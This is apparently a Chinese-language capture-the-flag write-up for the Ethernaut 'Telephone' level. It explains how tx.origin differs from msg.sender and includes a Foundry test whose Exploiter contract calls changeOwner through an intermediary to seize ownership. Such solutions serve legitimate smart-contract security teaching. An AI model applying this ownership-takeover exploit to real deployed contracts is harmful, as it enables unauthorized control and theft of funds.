`tx.origin` 表示整个交易的发起者 (一般是一个钱包地址)， `msg.sender` 表示当前交互调用的发起者，会在合约的调用链中改变。因此只要在合约中对 changeOwner 间接调用即可通过条件。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Telephone.sol";
import "src/levels/TelephoneFactory.sol";

contract TestTelephone is BaseTest {
    Telephone private level;

    constructor() public {
        levelFactory = new TelephoneFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = Telephone(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        Exploiter exploiter = new Exploiter();

        exploiter.exploit(level);

        vm.stopPrank();
    }
}

contract Exploiter {
    function exploit(Telephone telephone) public {
        telephone.changeOwner(msg.sender);
    }
}
```

